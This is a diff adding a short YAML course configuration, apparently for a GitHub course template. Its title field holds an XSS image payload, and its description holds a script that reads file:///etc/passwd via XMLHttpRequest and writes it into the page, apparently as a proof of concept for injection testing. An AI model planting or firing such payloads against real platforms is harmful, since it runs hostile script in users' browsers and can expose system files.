@@ -1,0 +1,18 @@
+title: '#<img src=x onerror=alert(''XSS'')>'
+description: >-
+  <script>x=new
+  XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+template:
+  repo: lessimg-srcx-onerroralert('xss')greater-template
+  name: lessimg-srcx-onerroralert('xss')greater
+before:
+  - type: createIssue
+    title: Welcome!
+    body: new-issue.md
+steps:
+  - title: First step
+    description: The first step in your course
+    event: issues.assigned
+    link: '{{ repoUrl }}'
+    actions:
+      - type: closeIssue
